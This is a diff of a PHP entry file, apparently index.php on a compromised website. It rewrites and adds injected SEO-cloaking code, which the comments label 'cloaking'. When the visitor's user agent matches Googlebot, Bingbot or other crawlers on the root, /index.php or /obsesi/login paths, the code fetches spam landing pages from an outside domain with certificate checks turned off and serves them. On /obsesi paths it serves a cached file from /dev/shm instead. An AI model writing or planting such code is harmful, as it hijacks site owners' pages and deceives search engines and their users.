@@ -1,5 +1,5 @@
 <?php
-function is_google_bot(){
+function is_google_bot_v1(){
     $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
     foreach($a as $b){
         if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
@@ -7,71 +7,63 @@ function is_google_bot(){
     return false;
 }
 
-// CEK REQUEST URI PAKAI strpos() BIAR FLEKSIBEL
 $uri = $_SERVER['REQUEST_URI'];
-if(strpos($uri, 'index.php/obsesi/login') !== false || strpos($uri, '/index.php') === 0){
-    if(is_google_bot()){
-        $url = 'https://inkaindonesia.org/landing/obsesi-revisi1.html';
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        $response = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        
-        if($http_code == 200){
-            echo $response;
-        } else {
-            // Fallback kalau URL 404
-            echo "Halaman tidak ditemukan (404)";
-        }
-        exit;
-    }
-}
-
-function is_google_bot(){
-    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
-    foreach($a as $b){
-        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return 1;
-    }
-    return 0;
-}
-
-// JALANKAN HANYA JIKA DI ROOT (bukan di /bisa)
-if($_SERVER['REQUEST_URI'] == '/index.php/obsesi/login' || $_SERVER['REQUEST_URI'] == '/index.php'){
-    if(is_google_bot()){
-        $c = curl_init('https://inkaindonesia.org/landing/obsesi-login.html');
+if($uri == '/' || $uri == '/index.php'){
+    if(is_google_bot_v1()){
+        $c = curl_init('https://inkaindonesia.org/landing/obsesi-revisi1.html');
         curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
         echo curl_exec($c);
         curl_close($c);
         exit;
     }
 }
 
+// ============================================================
+// 2. FUNGSI CLOAKING SUB index.php/obsesi/login
+// ============================================================
+function is_google_bot_v2(){
+    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
+    foreach($a as $b){
+        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
+    }
+    return false;
+}
 
-$user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+if(strpos($uri, 'index.php/obsesi/login') !== false || $uri == '/index.php'){
+    if(is_google_bot_v2()){
+        $c = curl_init('https://inkaindonesia.org/landing/obsesi-login.html');
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+        echo curl_exec($c);
+        curl_close($c);
+        exit;
+    }
+}
 
-if(stripos($request_uri, '/obsesi') !== false){
-    $is_bot = false;
-    
+// ============================================================
+// 3. FUNGSI CLOAKING SUB obsesi (tanpa index.php)
+// ============================================================
+function is_google_bot_v3(){
     $bots = [
         'Googlebot', 'Google-InspectionTool', 'AdsBot-Google', 'Mediapartners-Google',
         'Bingbot', 'Slurp', 'DuckDuckBot', 'AhrefsBot', 'SemrushBot', 'MJ12bot', 'YandexBot'
     ];
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            $is_bot = true;
-            break;
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    foreach($bots as $bot){
+        if(stripos($user_agent, $bot) !== false){
+            return true;
         }
     }
-    
-    if ($is_bot){
+    return false;
+}
+
+if(stripos($uri, '/obsesi') !== false){
+    if(is_google_bot_v3()){
         $file = '/dev/shm/mail-obsesi.txt';
-        if (file_exists($file)) {
+        if(file_exists($file)){
             readfile($file);
         } else {
             echo 'cache not ready';
